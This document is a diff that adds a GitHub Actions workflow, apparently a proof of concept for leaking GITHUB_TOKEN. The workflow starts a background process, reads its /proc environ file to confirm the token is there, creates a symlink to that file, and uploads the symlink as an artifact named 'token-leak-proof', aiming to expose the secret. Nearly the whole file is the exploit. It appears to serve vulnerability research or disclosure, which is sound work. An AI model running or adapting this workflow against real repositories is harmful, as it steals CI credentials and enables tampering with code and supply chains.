@@ -1,0 +1,45 @@
+name: Symlink GITHUB_TOKEN Leak via Background Process
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: write
+
+jobs:
+  leak-token:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Create background process with GITHUB_TOKEN in environ
+        run: |
+          # Start a background process that inherits this step's environment
+          # (including GITHUB_TOKEN which is set per-step)
+          (sleep 300) &
+          BG_PID=$!
+          echo "Background PID: $BG_PID"
+          echo "GITHUB_TOKEN in this step: ${#GITHUB_TOKEN} chars"
+          
+          # Verify the background process has GITHUB_TOKEN
+          echo "BG process environ GITHUB_TOKEN check:"
+          cat /proc/$BG_PID/environ | tr '\0' '\n' | grep "^GITHUB_TOKEN=" | wc -c
+          echo "chars (0 = not present)"
+          
+          # Create symlink to the background process's environ
+          ln -sf /proc/$BG_PID/environ symlink-bg-environ
+          ls -la symlink-bg-environ
+          
+          # Save the PID for cleanup
+          echo $BG_PID > /tmp/bg_pid
+
+      - name: Upload artifact with bg process symlink
+        uses: actions/upload-artifact@v4
+        with:
+          name: token-leak-proof
+          path: symlink-bg-environ
+          retention-days: 1
+
+      - name: Cleanup background process
+        if: always()
+        run: kill $(cat /tmp/bg_pid) 2>/dev/null || true
